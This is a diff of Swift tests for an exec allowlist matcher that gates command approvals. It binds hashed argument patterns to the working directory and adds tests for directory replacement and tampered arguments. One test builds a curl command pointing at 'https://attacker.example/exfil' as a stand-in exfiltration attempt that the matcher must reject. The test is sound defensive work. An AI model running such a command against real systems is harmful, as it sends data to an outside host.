@@ -40,13 +40,15 @@ struct ExecAllowlistTests {
         return fixture.cases
     }
 
-    private static func hashedArgPattern(_ argv: [String]) -> String {
+    private static func cwdBoundArgPattern(_ argv: [String], cwd: String) -> String {
+        let normalizedCwd = URL(fileURLWithPath: cwd).standardizedFileURL.resolvingSymlinksInPath().path
         let arguments = Array(argv.dropFirst())
-        let subject = "\(arguments.count)\0" + arguments
+        let argvSubject = "\(arguments.count)\0" + arguments
             .map { "\($0.data(using: .utf8)?.count ?? 0)\0\($0)\0" }
             .joined()
+        let subject = "\(normalizedCwd.data(using: .utf8)?.count ?? 0)\0\(normalizedCwd)\0\(argvSubject)"
         let digest = SHA256.hash(data: Data(subject.utf8))
-        return "sha256:argv:" + digest.map { String(format: "%02x", $0) }.joined()
+        return "sha256:cwd-argv:v1:" + digest.map { String(format: "%02x", $0) }.joined()
     }
 
     private static func fixtureURL(filename: String) -> URL {
@@ -71,6 +73,21 @@ struct ExecAllowlistTests {
     private static func makeExecutable(at url: URL, body: String = "#!/bin/sh\nexit 0\n") throws {
         try Data(body.utf8).write(to: url)
         try FileManager().setAttributes([.posixPermissions: 0o755], ofItemAtPath: url.path)
+    }
+
+    @Test func `approval cwd snapshot rejects directory replacement`() throws {
+        let root = FileManager.default.temporaryDirectory
+            .appendingPathComponent("openclaw-approval-cwd-\(UUID().uuidString)", isDirectory: true)
+        let approved = root.appendingPathComponent("approved", isDirectory: true)
+        let moved = root.appendingPathComponent("moved", isDirectory: true)
+        defer { try? FileManager.default.removeItem(at: root) }
+        try FileManager.default.createDirectory(at: approved, withIntermediateDirectories: true)
+        let snapshot = try #require(ExecCommandResolution.captureApprovalCwdSnapshot(approved.path))
+
+        #expect(ExecCommandResolution.revalidateApprovalCwdSnapshot(snapshot))
+        try FileManager.default.moveItem(at: approved, to: moved)
+        try FileManager.default.createDirectory(at: approved, withIntermediateDirectories: false)
+        #expect(!ExecCommandResolution.revalidateApprovalCwdSnapshot(snapshot))
     }
 
     @Test func `match uses resolved path`() {
@@ -186,7 +203,14 @@ struct ExecAllowlistTests {
 
     @Test func `match ignores legacy generated path only allow always entries`() {
         let executable = "/usr/bin/python3"
-        let legacyGenerated = ExecAllowlistEntry(pattern: executable, source: "allow-always")
+        let legacyGenerated = [
+            ExecAllowlistEntry(pattern: executable, source: "allow-always"),
+            ExecAllowlistEntry(
+                pattern: executable,
+                source: "allow-always",
+                argPattern: "sha256:argv:obsolete"),
+            ExecAllowlistEntry(pattern: executable, source: "allow-always", argPattern: #"^unsafe\.py$"#),
+        ]
         let manual = ExecAllowlistEntry(pattern: executable)
         let resolution = ExecCommandResolution(
             rawExecutable: executable,
@@ -196,7 +220,9 @@ struct ExecAllowlistTests {
             cwd: nil,
             argv: [executable, "unsafe.py"])
 
-        #expect(ExecAllowlistMatcher.match(entries: [legacyGenerated], resolution: resolution) == nil)
+        for entry in legacyGenerated {
+            #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: resolution) == nil)
+        }
         #expect(ExecAllowlistMatcher.match(entries: [manual], resolution: resolution) != nil)
     }
 
@@ -226,53 +252,73 @@ struct ExecAllowlistTests {
 
     @Test func `match enforces generated hashed arg patterns before regex fallback`() {
         let executable = "/usr/bin/curl"
+        let cwd = "/workspace"
         let approvedArgv = [executable, "https://trusted.example/install.sh"]
         let entry = ExecAllowlistEntry(
             pattern: executable,
-            argPattern: Self.hashedArgPattern(approvedArgv))
+            source: "allow-always",
+            argPattern: Self.cwdBoundArgPattern(approvedArgv, cwd: cwd))
         let approved = ExecCommandResolution(
             rawExecutable: executable,
             resolvedPath: executable,
             resolvedRealPath: executable,
             executableName: "curl",
-            cwd: nil,
+            cwd: cwd,
             argv: approvedArgv)
         let changed = ExecCommandResolution(
             rawExecutable: executable,
             resolvedPath: executable,
             resolvedRealPath: executable,
             executableName: "curl",
-            cwd: nil,
+            cwd: cwd,
             argv: [executable, entry.argPattern ?? "", "https://attacker.example/exfil"])
 
         #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: approved) != nil)
         #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: changed) == nil)
         #expect(entry.argPattern?.contains("trusted.example") == false)
+
+        let moved = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "curl",
+            cwd: "/other-workspace",
+            argv: approvedArgv)
+        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: moved) == nil)
     }
 
     @Test func `hashed arg pattern distinguishes zero args from empty args`() {
         let executable = "/usr/bin/tool"
+        let cwd = "/workspace"
         let zeroArgEntry = ExecAllowlistEntry(
             pattern: executable,
-            argPattern: Self.hashedArgPattern([executable]))
+            argPattern: Self.cwdBoundArgPattern([executable], cwd: cwd))
         let noArgs = ExecCommandResolution(
             rawExecutable: executable,
             resolvedPath: executable,
             resolvedRealPath: executable,
             executableName: "tool",
-            cwd: nil,
+            cwd: cwd,
             argv: [executable])
         let emptyArgs = ExecCommandResolution(
             rawExecutable: executable,
             resolvedPath: executable,
             resolvedRealPath: executable,
             executableName: "tool",
-            cwd: nil,
+            cwd: cwd,
             argv: [executable, "", ""])
 
-        #expect(zeroArgEntry.argPattern != Self.hashedArgPattern([executable, "", ""]))
+        #expect(zeroArgEntry.argPattern != Self.cwdBoundArgPattern([executable, "", ""], cwd: cwd))
         #expect(ExecAllowlistMatcher.match(entries: [zeroArgEntry], resolution: noArgs) != nil)
         #expect(ExecAllowlistMatcher.match(entries: [zeroArgEntry], resolution: emptyArgs) == nil)
+    }
+
+    @Test func `cwd bound hash matches the shared cross platform vector`() {
+        #expect(
+            Self.cwdBoundArgPattern(
+                ["/usr/bin/printf", "hello world", ""],
+                cwd: "/workspace") ==
+                "sha256:cwd-argv:v1:2b4f4aed226aa1fd771c852b8f74e4c162d440aafaf60bfef19746f3b2ee5890")
     }
 
     @Test func `arg pattern does not discard redirect shaped direct argv literal`() {
@@ -1013,7 +1059,7 @@ struct ExecAllowlistTests {
             env: ["PATH": "/usr/bin:/bin"])
 
         #expect(patterns.map(\.pattern) == ["/usr/bin/printf"])
-        #expect(patterns.first?.argPattern?.hasPrefix("sha256:argv:") == true)
+        #expect(patterns.first?.argPattern?.hasPrefix("sha256:cwd-argv:v1:") == true)
     }
 
     @Test func `allow always patterns fail closed for env modified shell wrappers`() {
@@ -1040,7 +1086,9 @@ struct ExecAllowlistTests {
             rawCommand: "/usr/bin/printf safe_marker")
 
         #expect(patterns.map(\.pattern) == ["/usr/bin/printf"])
-        #expect(patterns.first?.argPattern == Self.hashedArgPattern(["/usr/bin/printf", "safe_marker"]))
+        #expect(patterns.first?.argPattern == Self.cwdBoundArgPattern(
+            ["/usr/bin/printf", "safe_marker"],
+            cwd: FileManager.default.currentDirectoryPath))
     }
 
     @Test func `allow always never persists broad interpreter grants`() {
